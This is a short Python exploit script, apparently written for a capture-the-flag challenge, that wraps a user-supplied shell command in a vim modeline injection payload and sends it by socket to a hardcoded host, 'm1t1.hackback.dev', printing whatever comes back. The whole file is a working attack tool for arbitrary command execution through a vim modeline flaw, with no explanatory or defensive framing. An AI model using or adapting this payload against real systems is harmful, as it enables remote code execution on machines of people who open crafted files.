#!/usr/bin/env python
# -*- coding: utf-8 -*-
import socket
import argparse
BASE_PAYLOAD = ":!{}||\" vi:fen:fdm=expr:fde=assert_fails(\"source\!\ \%\"):fdl=0:fdt=\""
HOST = "m1t1.hackback.dev"
PORT = 16850
def connect(host, port, command):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((host,port))
    s.sendall(command)
    while True:
	    data = s.recv(1024)
	    if data == "":
		    break
	    print("Recieved: %s" % str(repr(data)))
    print("Connection Closed")
    s.close()



def main():
    parser = argparse.ArgumentParser(description='Command for exploiting vim source and modeline vulnerability')
    parser.add_argument('-c', help='Command to run through vim exploit', required=True, dest='command')
    args = parser.parse_args()
    connect(HOST,PORT,BASE_PAYLOAD.format(args.command))
    print(BASE_PAYLOAD.format(args.command))

if __name__ == "__main__":
    main()
